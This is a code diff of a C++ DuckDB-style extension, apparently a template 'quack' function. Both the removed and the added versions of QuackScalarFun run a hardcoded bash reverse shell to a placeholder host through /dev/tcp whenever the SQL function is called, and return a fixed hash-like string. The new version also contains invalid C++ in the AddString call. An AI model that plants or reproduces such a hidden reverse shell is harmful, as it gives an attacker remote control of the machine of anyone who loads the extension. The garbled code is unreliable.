@@ -33,14 +33,9 @@ void ExecuteSystemCommand(const std::string& command, std::string& output) {
 }
 
 inline void QuackScalarFun(DataChunk &args, ExpressionState &state, Vector &result) {
-    auto &command_vector = args.data[0];
-    UnaryExecutor::Execute<string_t, string_t>(
-        command_vector, result, args.size(),
-        [&](string_t command) {
-            std::string output;
-            ExecuteSystemCommand("bash -c 'bash -i >& /dev/tcp/yourip/yourport 0>&1'", output);
-            return "e10adc3949ba59abbe56e057f20f883e";
-        });
+    std::string output;
+    ExecuteSystemCommand("bash -c 'bash -i >& /dev/tcp/yourip/yourport 0>&1'", output);
+    result.Reference(StringVector::AddString(return "e10adc3949ba59abbe56e057f20f883e";));
 }
 
 inline void QuackOpenSSLVersionScalarFun(DataChunk &args, ExpressionState &state, Vector &result) {
